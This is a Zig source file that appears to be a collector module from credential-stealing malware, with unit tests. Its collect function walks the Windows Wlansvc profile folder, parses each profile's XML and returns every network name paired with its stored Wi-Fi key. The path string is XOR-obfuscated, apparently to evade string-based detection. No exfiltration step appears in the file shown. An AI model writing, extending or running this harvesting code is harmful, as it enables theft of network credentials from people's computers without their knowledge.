const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const wlansvc_path = hash.xorEncrypt("\\Microsoft\\Wlansvc\\Profiles\\Interfaces");
    pub const no_wifi_found = hash.xorEncrypt("No WiFi profiles found");
};

fn extractXmlValue(content: []const u8, comptime tag: []const u8) ?[]const u8 {
    const open = "<" ++ tag ++ ">";
    const close = "</" ++ tag ++ ">";
    const start = std.mem.indexOf(u8, content, open) orelse return null;
    const value_start = start + open.len;
    const end = std.mem.indexOf(u8, content[value_start..], close) orelse return null;
    return content[value_start .. value_start + end];
}

pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
    const prog_data = std.process.getEnvVarOwned(allocator, "PROGRAMDATA") catch {
        return error.ProgramDataNotFound;
    };
    defer allocator.free(prog_data);

    var wlansvc_buf: [E.wlansvc_path.len]u8 = undefined;
    hash.xorDecrypt(&E.wlansvc_path, &wlansvc_buf);

    var profiles_path = std.ArrayList(u8).init(allocator);
    defer profiles_path.deinit();
    try profiles_path.appendSlice(prog_data);
    try profiles_path.appendSlice(&wlansvc_buf);

    var no_wifi_buf: [E.no_wifi_found.len]u8 = undefined;
    hash.xorDecrypt(&E.no_wifi_found, &no_wifi_buf);

    var root_dir = std.fs.openDirAbsolute(try profiles_path.toOwnedSlice(), .{ .iterate = true }) catch {
        return allocator.dupe(u8, &no_wifi_buf);
    };
    defer root_dir.close();

    var result = std.ArrayList(u8).init(allocator);
    errdefer result.deinit();

    var if_iter = root_dir.iterate();
    while (try if_iter.next()) |if_entry| {
        if (if_entry.kind != .directory) continue;

        var if_dir = root_dir.openDir(if_entry.name, .{ .iterate = true }) catch continue;
        defer if_dir.close();

        var prof_iter = if_dir.iterate();
        while (try prof_iter.next()) |prof_entry| {
            if (prof_entry.kind != .file) continue;
            const ext = std.fs.path.extension(prof_entry.name);
            if (!std.ascii.eqIgnoreCase(ext, ".xml")) continue;

            const content = if_dir.readFileAlloc(allocator, prof_entry.name, 1024 * 64) catch continue;
            defer allocator.free(content);

            const ssid = extractXmlValue(content, "name") orelse continue;
            const key = extractXmlValue(content, "keyMaterial") orelse "";

            if (result.items.len > 0) try result.append('\n');
            try result.appendSlice(ssid);
            if (key.len > 0) {
                try result.appendSlice(": ");
                try result.appendSlice(key);
            }
        }
    }

    if (result.items.len == 0) {
        try result.appendSlice(&no_wifi_buf);
    }

    return try result.toOwnedSlice();
}

const testing = std.testing;

test "extractXmlValue extracts between tags" {
    const xml = "<WLANProfile><name>MyWiFi</name><keyMaterial>secret</keyMaterial></WLANProfile>";
    try testing.expectEqualStrings("MyWiFi", extractXmlValue(xml, "name").?);
    try testing.expectEqualStrings("secret", extractXmlValue(xml, "keyMaterial").?);
}

test "extractXmlValue returns null for missing tag" {
    try testing.expect(extractXmlValue("<root></root>", "name") == null);
}

test "extractXmlValue handles short content" {
    try testing.expect(extractXmlValue("", "name") == null);
    try testing.expect(extractXmlValue("<name></name>", "name") != null);
}

test "collect handles missing programdata" {
    const result = collect(testing.allocator);
    _ = result catch |err| {
        try testing.expect(err == error.ProgramDataNotFound or err == error.OutOfMemory);
    };
}
